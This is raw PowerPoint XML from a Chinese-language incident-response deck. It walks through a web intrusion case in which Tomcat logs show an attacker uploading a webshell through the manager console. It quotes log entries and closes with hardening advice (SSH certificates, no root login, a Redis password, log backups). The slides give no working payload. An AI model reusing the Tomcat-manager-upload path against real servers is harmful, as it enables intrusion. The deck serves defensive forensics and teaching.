                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>证书登录，避免直接使用密码进行登录，同时禁止</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1800" dirty="0">
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>root</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1800" dirty="0">
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>用户直接远程登录，对于需要</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1800" dirty="0">
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>root</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1800" dirty="0">
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>权限的操作，使用</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1800" dirty="0" err="1">
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>sudo</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1800" dirty="0">
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>等权限管理工具进行分配；</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="285750" indent="-285750">
              <a:lnSpc>
                <a:spcPts val="2600"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="p"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1800" dirty="0" err="1">
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>Redis</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1800" dirty="0">
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>数据库增加密码访问认证；</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="285750" indent="-285750">
              <a:lnSpc>
                <a:spcPts val="2600"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="p"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1800" dirty="0">
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>定期对系统日志进行备份，避免攻击者恶意删除相关日志文件，阻断溯源能力，同时加强日常安全巡查，防患于未然。</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1800" dirty="0">
              <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="矩形 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="251520" y="1484784"/>
            <a:ext cx="2350323"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相关处置建议：</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0033CC"/>
              </a:solidFill>
              <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              <a:cs typeface="+mj-cs"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="461592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87042"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="wipe(up)">
                                      <p:cBhvr>
                                        <p:cTn id="12" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="87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p:bldP spid="3" grpId="0"/>
    </p:bld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54251E-3E24-A349-899A-E49004B4CD44}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="539552"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lang="en-US" altLang="zh-CN" sz="2800" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              </a:rPr>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2800" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              </a:rPr>
              <a:t>入侵案例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8066" name="矩形 3"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="889397" y="1808820"/>
            <a:ext cx="749902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2400" dirty="0">
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>某单位网站被CNCERT通报，存在Webshell。</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buFontTx/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0">
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>http://xxx/servlets/</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buFontTx/>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0">
              <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buFontTx/>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0">
              <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="88067"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049" y="2924944"/>
            <a:ext cx="7572375"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32008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8066"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="wipe(up)">
                                      <p:cBhvr>
                                        <p:cTn id="7" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="8806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88067"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="11" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="88067"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_w</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:fltVal val="0"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_w"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="12" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="88067"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_h</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:fltVal val="0"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_h"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:animEffect transition="in" filter="fade">
                                      <p:cBhvr>
                                        <p:cTn id="13" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="88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2C0C59-0B72-8448-935E-46FAAF7C40EB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="251520" y="783291"/>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lang="en-US" altLang="zh-CN" sz="2800" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              </a:rPr>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2800" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              </a:rPr>
              <a:t>入侵案例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9090" name="矩形 2"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="395536" y="1630694"/>
            <a:ext cx="7272808" cy="966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FontTx/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>Step1: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0">
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>查看Tomcat控制台日志Calalina.2016-07-19.log日志，发现存在可疑的日志信息。</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="89091" name="矩形 4"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="404856" y="5157192"/>
            <a:ext cx="834360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None/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>Step2: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0">
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>查看Tomcat访问日志，localhost_access_log.20xx-0x-xx.txt </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0">
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>从时间、servlets路径、IP等作为线索分析日志。</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="89092"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816932"/>
            <a:ext cx="8816399" cy="2052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00328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9090"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="7" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="89090"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="0-#ppt_w/2"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="8" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="8909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89092"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="wipe(up)">
                                      <p:cBhvr>
                                        <p:cTn id="12" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="8909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89091"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="17" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="89091"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="0-#ppt_w/2"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="18" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="890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p:bldP spid="89091" grpId="0"/>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1D3691-8FCF-7A4E-83D0-161F4A283727}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="467544" y="837609"/>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lang="en-US" altLang="zh-CN" sz="2800" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              </a:rPr>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2800" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              </a:rPr>
              <a:t>入侵案例</a:t>
            </a:r>
            <a:endParaRPr sz="2800" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0033CC"/>
              </a:solidFill>
              <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65"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1831281787"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="664497" y="2251710"/>
          <a:ext cx="7873978" cy="1763561"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr>
                <a:effectLst>
                  <a:outerShdw blurRad="63500" sx="102000" sy="102000" algn="ctr" rotWithShape="0">
                    <a:prstClr val="black">
                      <a:alpha val="40000"/>
                    </a:prstClr>
                  </a:outerShdw>
                </a:effectLst>
              </a:tblPr>
              <a:tblGrid>
                <a:gridCol w="1564335">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="1807263976"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="872509">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="1011562197"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="1897172">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="3645100668"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="761619">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="1884148665"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="2093649">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="3972169468"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="684694">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="3487709186"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
              </a:tblGrid>
              <a:tr h="313194">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访问</a:t>
                      </a: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endPar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请求头</a:t>
                      </a:r>
                      <a:endPar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时间</a:t>
                      </a:r>
                      <a:endPar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METHOD</a:t>
                      </a:r>
                      <a:endPar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URL</a:t>
                      </a:r>
                      <a:endPar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状态码</a:t>
                      </a:r>
                      <a:endPar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extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="1480245020"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="96691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admin</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[19/Jul/2016:17:13:51</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POST</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/manager/html/</a:t>
                      </a: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upload?org.apache.catalina.filters.CSRF_NONCE</a:t>
                      </a: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=821EBD0AD668243E65AF90210F02E9EE</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990932804"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="241728">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[19/Jul/2016:17:14:02</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/servlets/</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214511109"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="241728">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[19/Jul/2016:17:14:08</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POST</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/servlets/?</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2906933228"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
            </a:tbl>
          </a:graphicData>
        </a:graphic>
      </p:graphicFrame>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="90151" name="文本框 4"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="678656" y="1697712"/>
            <a:ext cx="32452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 typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
              <a:defRPr kumimoji="1" sz="2000" b="1">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sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Step3: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2200" dirty="0" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Webshell</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2200" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>部署</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="90152" name="文本框 5"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="678656" y="4388011"/>
            <a:ext cx="4397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 typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
              <a:defRPr kumimoji="1" sz="2200" b="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>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sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>Step4:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>登录</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>tomcat</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>控制台</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="7" name="表格 6"/>
          <p:cNvGraphicFramePr>
            <a:graphicFrameLocks noGrp="1"/>
          </p:cNvGraphicFramePr>
          <p:nvPr>
            <p:extLst>
              <p:ext uri="{D42A27DB-BD31-4B8C-83A1-F6EECF244321}">
                <p14:modId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1590628106"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="678656" y="5130083"/>
          <a:ext cx="7886701" cy="852236"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr>
                <a:effectLst>
                  <a:outerShdw blurRad="63500" sx="102000" sy="102000" algn="ctr" rotWithShape="0">
                    <a:prstClr val="black">
                      <a:alpha val="40000"/>
                    </a:prstClr>
                  </a:outerShdw>
                </a:effectLst>
              </a:tblPr>
              <a:tblGrid>
                <a:gridCol w="1589088">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="1132665184"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="961231">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="1520052540"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="2078831">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="108470963"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="791766">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="2455445984"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="1489472">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="2865978797"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="976313">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="878550234"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
              </a:tblGrid>
              <a:tr h="24906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访问</a:t>
                      </a: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请求头</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时间</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METHOD</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URL</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状态码</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extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
